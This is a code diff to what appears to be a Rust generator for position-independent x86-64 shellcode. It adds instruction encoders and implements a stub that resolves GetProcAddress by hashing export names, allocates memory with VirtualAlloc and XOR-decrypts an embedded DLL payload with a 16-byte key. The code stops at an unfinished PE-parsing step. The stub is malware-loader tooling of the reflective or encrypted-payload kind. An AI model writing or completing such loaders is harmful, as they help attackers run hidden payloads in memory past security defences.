@@ -108,6 +108,14 @@ fn emit_modrm_mem(c: &mut Vec<u8>, reg: u8, base: u8, disp: i32) {
     }
 }
 
+// cmp r32, r32
+fn cmp_rr32(c: &mut Vec<u8>, a: u8, b: u8) {
+    let need_rex = a >= 8 || b >= 8;
+    if need_rex { emit_rex(c, false, b, a) }
+    c.push(0x39);
+    c.push(modrm(3, b, a));
+}
+
 // push r64
 fn push_r(c: &mut Vec<u8>, reg: u8) {
     if reg >= 8 { c.push(0x41) }
@@ -229,6 +237,14 @@ fn shl_ri8(c: &mut Vec<u8>, reg: u8, imm: u8) {
     c.push(imm);
 }
 
+// and r32, imm32
+fn and_ri32(c: &mut Vec<u8>, reg: u8, imm: u32) {
+    if reg >= 8 { emit_rex(c, false, 4, reg) }
+    c.push(0x81);
+    c.push(modrm(3, 4, reg));
+    c.extend_from_slice(&imm.to_le_bytes());
+}
+
 // add r64, imm32
 fn add_ri(c: &mut Vec<u8>, dst: u8, imm: i32) {
     emit_rex(c, true, 0, dst); // /0 = add
@@ -241,6 +257,14 @@ fn add_ri(c: &mut Vec<u8>, dst: u8, imm: i32) {
 fn sub_rr(c: &mut Vec<u8>, dst: u8, src: u8) {
     emit_rex(c, true, src, dst);
     c.push(0x29);
+    c.push(modrm(3, src, dst));
+}
+
+// xor r32, r32
+fn xor_rr(c: &mut Vec<u8>, dst: u8, src: u8) {
+    let need_rex = dst >= 8 || src >= 8;
+    if need_rex { emit_rex(c, false, src, dst) }
+    c.push(0x31);
     c.push(modrm(3, src, dst));
 }
 
@@ -425,7 +449,7 @@ fn gen_stub(h_gpa: u32, strings: &[(&str, Vec<u8>)]) -> (Vec<u8>, (Vec<usize>, u
     jmp_back(&mut c, hash_loop);
     patch8(&mut c, js_hash_done);
 
-    // TODO: Compare hash to GetProcAddress hash
+    // Compare hash to GetProcAddress hash
     cmp_ri32(&mut c, RDX, h_gpa);
     pop_r(&mut c, RSI);                                 // restore module entry
     pop_r(&mut c, RDI);                                 // restore names array
@@ -530,7 +554,71 @@ fn gen_stub(h_gpa: u32, strings: &[(&str, Vec<u8>)]) -> (Vec<u8>, (Vec<usize>, u
         patch32(&mut c, jz_fail); // TEMPORARY: patch to current pos
         // Ill fix this properly after the exit lable known
     }
-    
-    // TODO: Locate the payload and decrypt it
+
+    // Locate the payload and decrypt it
+    let lea_payload_pos = c.len();
+    lea_rd(&mut c, RSI, RBX, 0);
+
+    // Read metadata: [0..4]=size, [4..20]=key, [20..24]=magic, 32=enc_data
+    mov_rm32(&mut c, RCX, RSI, 0);                      // eax = DLL size             
+    mov_mr64(&mut c, RBP, -0x20, RCX);                  // save size
+    lea_rd(&mut c, RAX, RSI, 4);                        // rax = key ptr
+    mov_mr64(&mut c, RBP, -0x30, RAX);                  // save key ptr
+    lea_rd(&mut c, RAX, RSI, 32);                       // rax = encrypted data ptr
+    mov_mr64(&mut c, RBP, -0x38, RAX);                  // save encrypted data ptr
+
+    // VirtualAlloc(Null, size, MEM_COMMIT|MEM_RESERVE, PAGE_READWIRTE)
+    // rcx=0, rdx=size, r8=0x3000, r9=0x04
+    xor_rr(&mut c, RCX, RCX);                           // null
+    mov_rr(&mut c, RDX, RCX);                           // rdx = 0...size
+    mov_rm64(&mut c, RDX, RBP, -0x20);                  // rdx = dll size
+    mov_ri32(&mut c, R8, 0x3000);                       // MEM_COMMIT | MEM_RESERVE
+    mov_ri32(&mut c, R9, 0x04);                         // PAGE_READWRITE
+
+    // call VirtualAlloc
+    mov_rm64(&mut c, RAX, RBP, -0x08);                  // rax = VirtualAlloc
+    emit_call_with_shadow(&mut c, RAX, 0x20);
+    test_rr(&mut c, RAX, RAX);
+    let jz_alloc1_fail = jcc32(&mut c, 0x84);           // jz exit
+    mov_mr64(&mut c, RBP, -0x18, RAX);                  // save decrypt
+    mov_rr(&mut c, RDI, RAX);                           // rdi = dest
+
+    //XOR decrypt loop 
+    mov_rm64(&mut c, RSI, RBP, -0x38);                  // rsi = encrypted data
+    mov_rm64(&mut c, R15, RBP, -0x30);                  // r15 = key ptr
+    xor_rr(&mut c, RCX, RCX);                           // eax = 0
+    let decrypt_loop = c.len();
+    cmp_rr32(&mut c, RCX, RDX);
+    c.truncate(decrypt_loop);
+
+    // Set up decrypt loop
+    mov_rm64(&mut c, RSI, RBP, -0x38);                  // rsi = encrypted data
+    mov_rm64(&mut c, R15, RBP, -0x30);                  // r15 = key ptr
+    xor_rr(&mut c, RCX, RCX);                           // rcx = 0
+    mov_rm32(&mut c, R8, RBP, -0x20);                   // r8d = total size
+
+    let decrypt_loop = c.len();
+    cmp_rr32(&mut c, RCX, R8);                          // cmp ecx, r8d
+    let jge_decrypt_done = jcc32(&mut c, 0x8D);         // jge done
+
+    // byte = src[rcx] ^ key[rcx & 0xF]
+    movzx_rm8(&mut c, RAX, RSI, 0);                     // al = *rsi (src)
+    mov_rr(&mut c, RDX, RCX);
+    and_ri32(&mut c, RDX, 0x0F);                        // edx = rcx & 15
+    // key_byte at [r15 + rdx]
+    add_rr(&mut c, RDX, R15);
+    movzx_rm8(&mut c, RDX, RDX, 0);                     // dl = key[rcx & 15]
+    xor_rr(&mut c, RAX, RDX);                           // al ^= dl
+    c.push(0x88);                                       // store to dest
+    c.push(modrm(0, RAX, RDI));                         // mov [rdi], al
+    if (RDI & 7) == 4 { c.push(0x24) }                  // SIB for rsp based
+
+    inc_r(&mut c, RSI);
+    inc_r(&mut c, RDI);
+    inc_r(&mut c, RCX);
+    jmp_back(&mut c, decrypt_loop);
+    patch32(&mut c, jge_decrypt_done);
+
+    // TODO: Parse PE and allocate image
     unimplemented!()        
 }
